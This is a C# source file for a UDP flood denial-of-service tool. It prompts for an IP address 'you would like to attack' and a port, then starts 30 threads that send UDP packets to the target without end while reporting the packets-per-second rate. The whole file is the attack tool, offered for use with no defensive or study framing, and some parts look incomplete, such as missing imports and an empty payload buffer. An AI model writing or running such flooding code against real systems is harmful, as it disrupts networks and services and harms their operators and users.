using System.Collections.Generic;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Timers;
using System.ComponentModel;


public class udpdos
{
    public static int count = 0;
    public static byte[] sendbuf = new byte[0];
    public static string ipaddr;
    public static Random rnd = new Random();
    public static int port;
    public static UdpClient udpClient = new UdpClient();

    public static void Main(string[] args)
    {
        /*for (int i = 0; i < sendbuf.Length; i++)
        {
            sendbuf[i] = Convert.ToByte(rnd.NextInt64(100));
        }*/

        Console.WriteLine("Enter in the ip address you would like to attack. ");
        ipaddr = Console.ReadLine();

        Console.WriteLine("Enter in the port:");
        port = int.Parse(Console.ReadLine());


        startThreads();
        Thread temp = new Thread(new ThreadStart(timer));
        temp.Start();
        
    }
    public static void scream()
    {
        //UdpClient udpClient = new UdpClient();
        while (true)
        {
            udpClient.SendAsync(sendbuf, sendbuf.Length, ipaddr, port);
            count++;
        }

    }
    public static void timer()
    {
        while (true)
        {
            Thread.Sleep(2000);
            Console.WriteLine($"Speed: {count/2} packets per second");
            count = 0; 
        }
        
    }
    public static void startThreads()
    {
        for (int i = 0; i < 30; i++)
        {
            Thread listenThread = new Thread(new ThreadStart(scream));
            listenThread.Start();
        }

    }

}
